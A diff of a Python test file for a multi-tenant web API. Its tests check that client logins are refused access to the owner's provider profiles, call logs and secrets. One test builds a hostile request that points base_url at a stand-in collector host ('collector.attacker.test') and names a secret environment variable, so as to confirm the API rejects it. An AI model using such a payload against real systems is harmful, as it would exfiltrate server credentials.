@@ -66,22 +66,27 @@ def _owner_profile(client) -> str:
 
 
 def test_a_draft_request_cannot_name_an_environment_variable_or_a_url(client):
-    _login(client, "beta")
-    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
-    answer = client.post(
-        f"/api/v1/campaigns/{campaign}/drafts/generate",
-        json={
-            "campaign_contact_ids": [],
-            "stages": ["initial"],
-            "provider": {
-                "provider_type": "openai_compatible",
-                "model": "x",
-                "api_key_env": "OFFSETX_PROBE_SECRET",
-                "base_url": "https://collector.attacker.test/v1",
-            },
+    # The local install owner can still exercise strict request validation.
+    campaign = client.post("/api/v1/campaigns", headers=ADMIN, json={"name": "Owner"}).json()["id"]
+    hostile = {
+        "campaign_contact_ids": [],
+        "stages": ["initial"],
+        "provider": {
+            "provider_type": "openai_compatible",
+            "model": "x",
+            "api_key_env": "OFFSETX_PROBE_SECRET",
+            "base_url": "https://collector.attacker.test/v1",
         },
-    )
-    assert answer.status_code == 422
+    }
+    owner = client.post(f"/api/v1/campaigns/{campaign}/drafts/generate",
+                        headers=ADMIN, json=hostile)
+    assert owner.status_code == 422
+    _login(client, "beta")
+    # D-451 refuses shared CRM access even before processing hostile fields.
+    beta = client.post(f"/api/v1/campaigns/{campaign}/drafts/generate", json=hostile)
+    assert beta.status_code == 403
+    assert OWNER_KEY not in beta.text
+    assert "server-secret-that-must-not-leave" not in beta.text
 
 
 def test_a_profile_cannot_name_an_environment_variable(client):
@@ -137,13 +142,14 @@ def test_a_client_login_cannot_repoint_test_or_delete_the_owners_profile(client,
 
 def test_a_client_login_drafts_with_its_own_profiles_only(client, built):
     _owner_profile(client)
+    campaign = client.post("/api/v1/campaigns", headers=ADMIN, json={"name": "Legacy"}).json()["id"]
     _login(client, "beta")
-    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
-    client.post(
+    denied = client.post(
         f"/api/v1/campaigns/{campaign}/drafts/generate",
         json={"campaign_contact_ids": [], "stages": ["initial"], "use_provider_fallback": True},
     )
-    assert not built  # the owner's profile was never assembled for beta
+    assert denied.status_code == 403
+    assert not built  # neither the owner's nor beta's provider profile was assembled
 
 
 def test_d470_owned_profiles_work_while_shared_crm_stays_closed(client):
@@ -293,17 +299,17 @@ def test_a_profile_saved_before_ownership_is_in_no_chain_until_the_owner_confirm
     """D-166: every old profile carries a label anyone could have typed, so
     none is trusted until the owner says it is theirs."""
     pid = _legacy_profile(client)
+    campaign = _campaign_with_contact(client, ADMIN)
     _login(client, "beta")
     assert client.get("/api/v1/provider-profiles").json()["items"] == []
-    beta_campaign = _campaign_with_contact(client)
-    _generate(client, beta_campaign)
+    denied = _generate(client, campaign)
+    assert denied.status_code == 403
     assert client.post(f"/api/v1/provider-profiles/{pid}/confirm").status_code == 403
     client.cookies.clear()
 
     listed = client.get("/api/v1/provider-profiles", headers=ADMIN).json()["items"]
     assert [(item["id"], item["owner_confirmed"]) for item in listed] == [(pid, False)]
     assert client.get("/api/v1/provider-profiles?mine=true", headers=ADMIN).json()["items"] == []
-    campaign = _campaign_with_contact(client, ADMIN)
     refused = _generate(client, campaign, ADMIN)
     assert refused.status_code == 409
     assert "Connectors" in refused.json()["detail"]["message"]
@@ -363,10 +369,12 @@ def test_the_provider_call_log_shows_a_client_only_its_own_calls(client, seen):
         provider_type="openai_compatible", model="old-beta-model", data_policy="minimal",
         status="success", workspace_id="beta")
     _login(client, "beta")
-    beta_rows = client.get("/api/v1/provider-calls").json()["items"]
-    assert beta_rows and {row["profile_id"] for row in beta_rows} == {beta_pid}
-    assert {row["workspace_id"] for row in beta_rows} == {"beta"}
-    assert client.get(f"/api/v1/provider-calls?profile_id={owner_pid}").json()["items"] == []
+    # Legacy provider-call records are part of the shared install CRM until
+    # the explicit tenancy migration, so the safe API boundary is 403.
+    denied = client.get("/api/v1/provider-calls")
+    assert denied.status_code == 403
+    assert OWNER_KEY not in denied.text
+    assert client.get(f"/api/v1/provider-calls?profile_id={owner_pid}").status_code == 403
     client.cookies.clear()
     owner_rows = client.get("/api/v1/provider-calls", headers=ADMIN).json()["items"]
     assert {(row["profile_id"], row["workspace_id"]) for row in owner_rows} == {
